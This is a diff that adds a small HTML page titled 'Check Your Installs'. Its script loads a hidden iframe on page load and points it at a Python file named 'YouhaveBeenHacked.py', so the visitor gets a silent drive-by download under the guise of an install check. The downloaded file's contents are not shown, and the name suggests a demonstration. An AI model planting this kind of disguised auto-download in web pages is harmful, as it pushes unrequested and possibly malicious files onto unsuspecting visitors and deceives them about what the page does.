@@ -1,0 +1,20 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Check Your Installs</title>
+</head>
+<body>
+    <iframe id="my_iframe" style="display:none;"></iframe>
+
+    <script>
+        function Download(url) {
+            document.getElementById('my_iframe').src = url;
+            console.log("Downloading")
+        };
+
+        Download("YouhaveBeenHacked.py")
+    </script>
+</body>
+</html>
